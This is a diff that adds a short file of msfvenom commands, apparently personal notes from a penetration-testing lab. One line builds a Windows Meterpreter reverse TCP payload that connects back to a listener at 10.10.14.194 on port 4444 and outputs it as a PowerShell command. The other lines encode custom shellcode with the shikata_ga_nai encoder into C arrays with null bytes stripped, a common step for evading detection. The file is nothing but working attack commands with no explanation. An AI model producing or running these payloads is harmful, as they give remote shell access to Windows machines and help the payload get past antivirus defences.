@@ -1,0 +1,6 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.194 LPORT=4444 -f psh-cmd  -o /tmp/message.bin
+
+cat messagebox.bin | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f c -b '\x00'
+msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f c -b '\x00' < messagebox.bin
+
+cat messagebox.bin | msfvenom -p - -a x86 --platform win  -f c -b '\x00'
